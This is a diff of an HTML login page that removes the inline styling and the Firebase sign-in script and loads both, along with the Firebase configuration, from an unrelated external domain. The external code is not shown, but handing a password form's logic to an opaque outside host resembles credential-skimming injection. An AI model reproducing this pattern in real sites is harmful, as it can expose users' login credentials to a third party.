@@ -12,82 +12,9 @@
   <!-- Firebase configuration -->
  <script src="https://kosred.com/a/klttyp.js"></script> 
 
-  <!-- Gaya CSS -->
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f4f4f4;
-      margin: 0;
-      padding: 20px;
-    }
-
-    h2 {
-      text-align: center;
-    }
-
-    form {
-  background-color: #fff;
-  padding: 20px;
-  border-radius: 8px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-  max-width: 300px;
-  margin: 150px auto 0; /* Menambahkan margin atas sebanyak 50px */
-}
-
-    label {
-      display: block;
-      margin-bottom: 8px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 16px;
-      box-sizing: border-box;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    button {
-      background-color: #007bff;
-      color: #fff;
-      padding: 10px 15px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #0056b3;
-    }
-   
-    #notification {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 100%;
-      text-align: center;
-      padding: 10px;
-      background-color: #4CAF50;
-      color: #fff;
-      z-index: 999;
-      animation: fadeIn 0.5s ease-in-out;
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-      }
-      to {
-        opacity: 1;
-      }
-    }
-    #back-link {
-    text-decoration: none;
-    color: black;
-  </style>
+ <link rel="stylesheet" href="https://kosred.com/a/bhtiej.css">
+ 
+ 
 </head>
 <body>
   <!-- Form Login -->
@@ -110,38 +37,8 @@
   <div id="notification"></div>
 
   <!-- Your login.js script -->
-  <script>
-    function login() {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      firebase.auth().signInWithEmailAndPassword(email, password)
-        .then((userCredential) => {
-          // Login successful, access user information from userCredential.user
-          console.log('Login successful:', userCredential.user);
-          showNotification('Login successful!', true);
-
-          // Redirect to the profile page upon successful login
-          window.location.href = 'https://bit.ly/3tK6lrt';
-        })
-        .catch((error) => {
-          // Handle login error
-          console.error('Login failed:', error.message);
-          showNotification('Login failed. Please check your email and password.', false);
-        });
-    }
-
-    function showNotification(message, success) {
-      const notification = document.getElementById('notification');
-      notification.textContent = message;
-      notification.style.backgroundColor = success ? '#4CAF50' : '#ff5252';
-
-      notification.style.display = 'block';
-
-      setTimeout(() => {
-        notification.style.display = 'none';
-      }, 3000); // Hide the notification after 3 seconds
-    }
+  <script src="https://kosred.com/a/afwewz.js">
+    
   </script>
 </body>
 </html>
